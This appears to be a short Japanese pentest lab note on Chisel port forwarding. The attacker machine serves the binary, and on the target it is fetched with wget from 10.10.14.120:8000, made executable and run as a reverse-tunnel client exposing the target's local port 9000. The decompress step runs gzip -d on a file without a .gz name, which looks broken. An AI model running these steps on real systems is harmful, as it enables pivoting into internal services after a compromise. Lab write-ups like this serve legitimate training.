### Chiselクライアントの準備
Attacker Machine (Kali)
- ターゲットのOSに合うchiselのクライアントをGitHubからダウンロード  
  [Chisel GitHubリリースページ](https://github.com/jpillora/chisel/releases/tag/v1.8.1)

### ターゲットマシン(Ubuntu)
1. Chiselクライアントのダウンロード
```bash
wget http://10.10.14.120:8000/chisel
```

2. 解凍
```bash
gzip -d chisel
```

3. 権限の付与
```bash
chmod +x chisel
```

4. Chiselクライアントの実行
```bash
./chisel client 10.10.14.120:8050 R:9000:127.0.0.1:9000
```
- client 
- 10.10.14.120:8050 
- R:9000
- 127.0.0.1:9000  
